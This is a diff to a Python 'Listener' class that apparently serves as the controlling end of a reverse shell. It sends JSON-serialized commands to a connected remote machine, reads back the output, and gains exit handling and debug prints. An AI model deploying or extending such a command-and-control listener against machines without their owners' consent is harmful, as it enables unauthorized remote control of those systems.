@@ -18,12 +18,13 @@ class Listener:
         print(f'[*] Incoming connection from {conn_addr}')
 
 
-    def serial_send(self, data:str) :
+    def serial_send(self, data:str or list) :
         '''
         serialize data and send over TCP socket.
         '''
         json_data = json.dumps(data)
         bytes_json_data = bytes(json_data, encoding='utf-8')
+        # print('Listener sent: ',bytes_json_data)
         self.connection.send(bytes_json_data)
 
 
@@ -36,12 +37,24 @@ class Listener:
         while True:
             try:
                 bytes_json_data += self.connection.recv(1024)
-                return json.loads(bytes_json_data)
+                data = json.loads(bytes_json_data)
+                # print('Listener Rec: ',data)
+                return data
             except json.JSONDecodeError:
                 continue
 
+
     def execute_remotely(self, command):
+        '''
+        execute command on the remote machine.
+        '''
         self.serial_send(command)
+        
+        command = command.split(' ')
+        if command[0] == 'exit':
+            self.connection.close()
+            sys.exit()
+
         return self.serial_receive()
 
 
@@ -54,8 +67,9 @@ class Listener:
 
             except KeyboardInterrupt:
                 print('[!] ctrl+c detected. Closing and exiting server/listener')
+                self.serial_send('exit')
                 self.server.close()
                 sys.exit()
 
             except Exception as e:
-                print('[-] Exception : ', e)
+                print('[-] Listener Exception : ', e)
